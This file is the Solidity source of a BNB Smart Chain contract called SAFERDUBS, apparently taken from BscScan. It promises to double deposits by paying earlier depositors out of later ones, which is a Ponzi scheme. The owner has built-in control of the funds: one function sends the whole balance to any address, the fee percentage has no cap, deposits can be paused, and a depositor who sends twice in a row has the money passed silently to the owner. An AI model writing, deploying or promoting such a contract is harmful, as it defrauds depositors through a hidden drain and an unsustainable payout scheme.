/**
 *Submitted for verification at BscScan.com on 2022-06-04
*/

/**
 *Submitted for verification at BscScan.com on 2022-03-22
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.7.4;



contract SAFERDUBS {

    struct user{
        uint256 amount;
        address userAddr;
    }

    modifier onlyOwner{
        require(msg.sender == owner);
        _;
    }

    address owner = 0xc91f46AA2B07821907B8A998340c0D66cdb0ff72;

    mapping(uint256 => user) public IDToUser;
    uint256 public currentID;
    uint256 public totalID;
    address public lastApe;

    uint256 maxBNBAccepted = 10000000000000000;
    uint256 devFeePercentage = 2;

    uint256 gainsMultiplier = 2;

    function setDevFeePercentage(uint256 percent) public onlyOwner{
        devFeePercentage = percent;
    }

    function setGainsMultiplier(uint256 gm) public onlyOwner{
        require (gm > 0);
        gainsMultiplier = gm;
    }

    function setMaxBNBAccepted(uint256 maxBNBAccept) public onlyOwner{
        maxBNBAccepted = maxBNBAccept;
    }

    bool allowTransfer = true;

    function setAllowTransfer(bool b) public onlyOwner{
        allowTransfer = b;
    }

    function unstuckBalance(address receiver) public onlyOwner{
        uint256 contractETHBalance = address(this).balance;
        payable(receiver).transfer(contractETHBalance);
    }

    receive() payable external {
        require(msg.value <= maxBNBAccepted && allowTransfer == true);
        if (msg.sender == lastApe && msg.sender != owner) {
            payable(owner).transfer(msg.value);
        } else {
            IDToUser[totalID].userAddr = msg.sender;
            IDToUser[totalID].amount = msg.value;
            totalID++;
            uint256 devBalance = (msg.value * devFeePercentage) > 100 ? (msg.value * devFeePercentage) / 100 : 0;
            payable(owner).transfer(devBalance);

            uint256 availableBalance = address(this).balance;
            uint256 amountToSend = IDToUser[currentID].amount;
            lastApe = msg.sender;
            if(availableBalance >= amountToSend * gainsMultiplier){
                payable(IDToUser[currentID].userAddr).transfer(amountToSend * gainsMultiplier);
                currentID++;
            }
        }
    }
        

}